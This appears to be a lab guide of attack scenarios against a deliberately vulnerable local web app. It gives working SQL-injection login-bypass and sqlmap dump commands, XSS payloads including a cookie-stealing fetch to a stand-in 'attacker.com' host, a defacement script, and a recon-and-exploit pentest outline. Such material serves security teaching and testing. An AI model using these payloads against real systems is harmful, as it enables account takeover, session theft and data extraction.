# Attack Scenarios

## Scenario 1: SQL Injection Attack

### Objective
Bypass authentication using SQL injection

### Steps
1. **Reconnaissance**
   ```bash
   nmap -A vulnerable-web
   nikto -h http://vulnerable-web
   ```

2. **Manual Testing**
   ```bash
   curl -X POST http://vulnerable-web \
     -d "username=admin' OR '1'='1&password=anything"
   ```

3. **Automated Testing**
   ```bash
   sqlmap -u "http://vulnerable-web" --forms --batch --level=3
   ```

4. **Data Extraction**
   ```bash
   sqlmap -u "http://vulnerable-web" --forms --batch --dump
   ```

## Scenario 2: XSS Attack

### Objective
Execute malicious JavaScript in the application

### Steps
1. **Basic XSS Test**
   - Navigate to http://localhost:8080
   - Username: `<script>alert('XSS')</script>`
   - Password: `anything`

2. **Cookie Stealing**
   ```javascript
   <script>
   fetch('http://attacker.com/steal.php?cookie=' + document.cookie);
   </script>
   ```

3. **Page Defacement**
   ```javascript
   <script>
   document.body.innerHTML = '<h1 style="color:red">HACKED!</h1>';
   </script>
   ```

## Scenario 3: Full Penetration Test

### Objective
Complete security assessment of the web application

### Steps
1. **Information Gathering**
   ```bash
   nmap -A vulnerable-web
   dirb http://vulnerable-web
   ```

2. **Vulnerability Scanning**
   ```bash
   nikto -h http://vulnerable-web
   ```

3. **Manual Testing**
   ```bash
   # Test for common vulnerabilities
   curl http://vulnerable-web/robots.txt
   curl http://vulnerable-web/.htaccess
   ```

4. **Exploitation**
   ```bash
   # SQL Injection
   sqlmap -u "http://vulnerable-web" --forms --batch
   
   # XSS testing in browser
   # Navigate to http://localhost:8080
   # Test various XSS payloads
   ```

5. **Reporting**
   - Document all findings
   - Provide remediation recommendations
   - Create executive summary